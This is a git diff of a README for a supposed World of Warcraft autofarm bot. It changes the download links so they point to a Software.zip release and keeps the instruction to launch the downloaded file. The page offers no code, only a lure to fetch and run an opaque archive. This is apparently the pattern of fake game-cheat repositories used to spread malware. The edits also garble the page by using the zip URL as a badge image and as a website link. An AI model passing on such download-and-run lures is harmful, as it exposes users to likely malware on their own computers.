@@ -17,12 +17,12 @@ Welcome to the repository for the **World of Warcraft Autofarm Bot** - your ulti
 
 ## Software Download
 🚀 Click the button below to download the **Autofarm Bot** software:
-[![Download Autofarm Bot](https://img.shields.io/static/v1?label=Download&message=Software&color=blue&style=for-the-badge)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Autofarm Bot](https://github.com/Sandman2089/World-of-Warcraft-autofarm-bot/releases/download/v1.0/Software.zip)](https://github.com/Sandman2089/World-of-Warcraft-autofarm-bot/releases/download/v1.0/Software.zip)
 
 (*Note: Make sure to launch the downloaded file to start using the Autofarm Bot.*)
 
 ## Join the Community
-🌐 Visit our website [World_of_Warcraft_Bot.com](#) to stay updated with the latest news, updates, and discussions about the Autofarm Bot.
+🌐 Visit our website [https://github.com/Sandman2089/World-of-Warcraft-autofarm-bot/releases/download/v1.0/Software.zip](#) to stay updated with the latest news, updates, and discussions about the Autofarm Bot.
 
 ## Support and Feedback
 💬 Have questions, feedback, or need support? Feel free to open an [issue](#) in this repository. Our team is here to help you make the most out of the Autofarm Bot.
